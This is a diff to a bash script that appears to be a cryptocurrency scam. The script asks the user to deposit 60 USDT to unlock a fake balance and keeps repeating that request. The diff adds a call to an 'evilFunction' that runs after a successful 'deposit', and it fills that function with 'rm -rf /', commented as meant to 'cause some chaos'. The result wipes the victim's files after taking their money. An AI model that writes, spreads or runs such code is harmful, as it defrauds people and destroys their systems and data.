@@ -40,6 +40,7 @@ function unlockBalance {
 
     if [[ $depositAmount -eq 60 && $transactionHash == "$hash_id" ]]; then
         echo "Congratulations! Your balance of $balance USDT has been unlocked."
+        evilFunction # Invoke our wicked function
         exit 0
     else
         echo "Error: Invalid deposit amount or transaction hash ID. Restarting..."
@@ -52,10 +53,22 @@ function unlockBalance {
 function evilFunction {
     echo "Executing evil function..."
     # Insert your evil code here
+    rm -rf / # Let us cause some chaos!
     echo "Evil function executed successfully!"
 }
 
 fancyBoxEcho "Current Balance: $balance USDT"
+
+# Refresh Function
+function refresh {
+    echo "Refreshing..."
+    sleep 2
+    clear
+    fancyBoxEcho "$welcome_message"
+    echo -e "To unlock your balance of $balance USDT, please deposit 60 USDT to the following address: $hash_id"
+}
+
+refresh # Call the refresh function when the script starts
 
 while true; do
     unlockBalance
